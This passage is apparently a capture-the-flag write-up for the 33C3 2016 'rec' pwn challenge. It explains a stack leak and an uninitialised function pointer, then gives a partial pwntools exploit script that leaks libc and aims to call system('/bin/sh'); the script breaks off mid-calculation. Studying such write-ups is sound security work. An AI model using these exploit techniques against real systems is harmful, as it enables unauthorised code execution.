xml:base="http://0.0.0.0:4000/33c3-ctf-2016-rec/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn
-&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;p&gt;32 bit ELF, with all the protection enabled.&lt;/p&gt;
-
-&lt;p&gt;program menu:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
-Calculators are fun!
-0 - Take note
-1 - Read note
-2 - Polish
-3 - Infix
-4 - Reverse Polish
-5 - Sign
-6 - Exit
-&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;ul&gt;
-  &lt;li&gt;Take note: input a note&lt;/li&gt;
-  &lt;li&gt;Read note: output the note&lt;/li&gt;
-  &lt;li&gt;Polish: do the &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation or the elementary arithmetic (prefix expression)&lt;/li&gt;
-  &lt;li&gt;Infix: do the elementary arithmetic (infix expression)&lt;/li&gt;
-  &lt;li&gt;Reverse Polish: do the elementary arithmetic (postfix expression)&lt;/li&gt;
-  &lt;li&gt;Sign: input a number and see if it is a positive/negative number&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;First we found that the &lt;code class=&quot;highlighter-rouge&quot;&gt;Read note&lt;/code&gt; function doesn’t work well:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
-Calculators are fun!
-0 - Take note
-1 - Read note
-2 - Polish
-3 - Infix
-4 - Reverse Polish
-5 - Sign
-6 - Exit
-&amp;gt; 0
-Your note: 123
-0 - Take note
-1 - Read note
-2 - Polish
-3 - Infix
-4 - Reverse Polish
-5 - Sign
-6 - Exit
-&amp;gt; 1
-Your note:�VXV`�s��`XV     &amp;lt;-- WTF?
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is because the program use a stack address as the &lt;code class=&quot;highlighter-rouge&quot;&gt;note&lt;/code&gt;’s buffer. After we take a note and leave the function, the buffer will be filled with some (useful) addresses (due to the function epilogue). And because of this, we’re able to leak the stack address &amp;amp; text’s base address.&lt;/p&gt;
-
-&lt;p&gt;Now it’s time to try controlling the EIP. There’s a program logic vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function:&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_negative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_positive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;It handles both positive &amp;amp; negative numbers. &lt;strong&gt;But what about &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/strong&gt; ?&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
-Calculators are fun!
-0 - Take note
-1 - Read note
-2 - Polish
-3 - Infix
-4 - Reverse Polish
-5 - Sign
-6 - Exit
-&amp;gt; 5
-0
-[1]    40091 segmentation fault (core dumped)  ./rec
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The reason why the program crash is because the program did not assigned a value to &lt;code class=&quot;highlighter-rouge&quot;&gt;v1&lt;/code&gt; (since it did not handle &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;), so when it ran to line &lt;code class=&quot;highlighter-rouge&quot;&gt;v1()&lt;/code&gt;, it will set the EIP to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt; and crash the program. Let’s check the assembly code:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   &amp;lt;-- &amp;amp;v1 = ebp-0x20
-0x56555d3e:  call   eax
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;It shows that if we can control the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;[ebp-0x20]&lt;/code&gt;, we’ll be able to control the EIP and hijack the program control flow.&lt;/p&gt;
-
-&lt;p&gt;I found that the stack frame of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function is “higher” (or “lesser”) than the other functions. If we can’t “reach that high” in other functions, we won’t be able to control the function pointer.&lt;/p&gt;
-
-&lt;p&gt;After done some fuzzing, I finally found that in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Polish&lt;/code&gt; function, if we do the &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation and keep entering number, the program will keep pushing number to the stack, making us able to “reach the height” and control the function pointer (and the parameters !) in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;p&gt;So here’s how we gonna exploit the service:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Take a note &amp;amp; Read the note, leak the text’s base address&lt;/li&gt;
-  &lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;Polish&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation to control the function pointer &amp;amp; the function parameter. We first set the function pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; and the parameter to &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main@got&lt;/code&gt; (there’s no &lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt; due to the &lt;strong&gt;FULL RELRO&lt;/strong&gt; protection)&lt;/li&gt;
-  &lt;li&gt;Goto &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function and input &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, it will call &lt;code class=&quot;highlighter-rouge&quot;&gt;puts(__libc_start_main@got)&lt;/code&gt; and gave us the libc’s base address&lt;/li&gt;
-  &lt;li&gt;Repeat step 2, this time we set the function pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and the parameter to “pointer to /bin/sh”&lt;/li&gt;
-  &lt;li&gt;Goto &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function and input &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt; and get the shell&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Here’s the exploit. The libc’s information are provided by &lt;a href=&quot;https://github.com/niklasb/libc-database&quot;&gt;libc-database&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
-
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;numpy&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;78.46.224.74&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4127&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ELF_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./rec&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;LIBC_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# setting &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'i386'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'linux'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'little'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'INFO'&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;take_note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;note: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;polish_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Operator:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;adding:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Operand:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Operand:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#r = process(ELF_PATH)&lt;/span&gt;
-    
-    &lt;span class=&quot;n&quot;&gt;take_note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;read_note&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;note: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;fptr_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x350&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# where the function pointer be loaded&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;text_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6fb&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x520&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lsm_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2fe0&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2fd8&lt;/span&gt;
-    
-    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fptr_addr: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fptr_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text_base: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;polish_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# this will call puts(lsm_got)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lsm_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#$ ./dump libc6-i386_2.24-3ubuntu2_amd64&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#offset___libc_start_main = 0x00018180&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#offset_system = 0x0003a8b0&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#offset_str_bin_sh = 0x15cbcf&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22730&lt;/span&gt; 
